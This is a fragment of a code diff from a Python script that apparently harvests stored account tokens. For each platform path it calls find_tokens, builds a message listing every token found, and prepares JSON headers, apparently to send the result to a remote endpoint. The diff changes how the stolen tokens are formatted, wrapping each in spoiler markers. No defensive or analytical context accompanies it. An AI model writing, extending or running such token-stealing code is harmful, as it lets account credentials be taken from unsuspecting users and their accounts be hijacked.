@@ -49,17 +49,17 @@ def main():
         if not os.path.exists(path):
             continue
 
-        message += f'\n**{platform}**\n```\n'
+        message += f'\n**{platform}**\n\n'
 
         tokens = find_tokens(path)
 
         if len(tokens) > 0:
             for token in tokens:
-                message += f'{token}\n'
+                message += f'||{token}||\n'
         else:
-            message += 'No tokens found.\n'
+            message += '\n'
 
-        message += '```'
+        message += ''
 
     headers = {
         'Content-Type': 'application/json',
